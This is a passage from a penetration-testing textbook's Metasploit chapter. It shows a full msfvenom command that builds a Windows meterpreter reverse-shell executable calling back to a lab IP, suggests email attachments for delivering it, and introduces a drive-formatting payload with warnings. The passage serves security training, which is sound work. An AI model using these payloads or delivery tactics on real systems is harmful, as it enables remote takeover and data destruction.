- pgno: 343
  md: '+   - Linux or linux

    +   - Cisco or cisco

    +   - Android or android


    Notice that you can choose to capitalize the first letter, or not. So, putting
    it all together, here is our previous example with all the flags selected:


    ```

    msfvenom -a x86 --platform Windows -p windows/meterpreter/

    reverse_tcp lhost=192.168.56.101 lport=4444 -f exe -o mypayload.exe

    ```


    You can literally put any of the Metasploit payloads, or even a customized payload
    of your own creation, into a file using msfvenom. Then it is up to you how you
    deliver that to the target. Email attachments are still a very effective way to
    do this.


    # More Metasploit Attacks


    In Chapter 13 we focused on attacks that were guaranteed to work, at least on
    the target of Windows 7 with no service pack. The concept was to get you accustomed
    to how to use Metasploit, in an environment that was guaranteed to give you success.
    However, you probably already realize that this was an artificial scenario, and
    not very much like real-world systems. In this section we will look at attacks
    on a variety of targets. However, none are guaranteed to work. You will likely
    try each of these and only get one or two to work. However, it is time to take
    you to the next stage in your Metasploit learning, and to more closely approximate
    real-world scenarios.


    # Formatting All Drives


    This exploit is best delivered as an msfvenom module. I caution you that this
    one is highly destructive. I do not recommend using it in a penetration test.
    However, it can be used on a test machine, simply to drive home just how much
    damage attachments can cause. As the name suggests, it is designed to format all
    the drives on the target machine. And it is easy to use, as you can see in Figure
    14-14.


    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_343_0.png)


    FIGURE 14-14 Format All Drives.


    It is difficult to overstate just how careful you should be with exploits such
    as this.'
